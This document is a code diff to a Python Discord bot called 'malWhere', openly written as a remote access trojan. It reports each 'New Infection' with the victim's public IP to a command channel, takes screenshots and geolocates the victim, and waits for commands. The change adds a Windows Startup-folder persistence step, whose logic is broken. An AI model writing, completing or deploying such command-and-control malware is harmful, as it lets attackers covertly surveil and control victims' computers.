@@ -42,6 +42,11 @@ TOKEN=decryp5
 
 malWhere = commands.Bot(command_prefix='$')
 malWhere.remove_command('help')
+guild = malWhere.get_guild(<guild-id>)
+
+persistencefile=f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.py"
+if not persistencefile:
+  shutil.copy(__file__, "startup.py")
 
 r = requests.get('https://api.ipify.org?format=json')
 response=r.json()
@@ -52,10 +57,7 @@ ip4chan=ip.replace(".","")
 async def on_ready():
   try:
     print(f"logged in as {malWhere}")
-    guild = malWhere.get_guild(<guild-id>)
     infeinfectionschannel=malWhere.get_channel(<infection-channel-id>)
-    #insert peristance module for windows
-    #clone necesssary files into startup 
     existing_channel = discord.utils.get(guild.channels, name=ip4chan)
     if not existing_channel:
       embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands"))
@@ -115,7 +117,6 @@ async def geolocate(ctx):
 @malWhere.command()
 async def screenshot(ctx):
   try:
-    guild = malWhere.get_guild(<guild id again>)
     existing_channel = discord.utils.get(guild.channels, name=(f"{ip4chan}-media"))
     channel_id = existing_channel.id
     if not existing_channel:
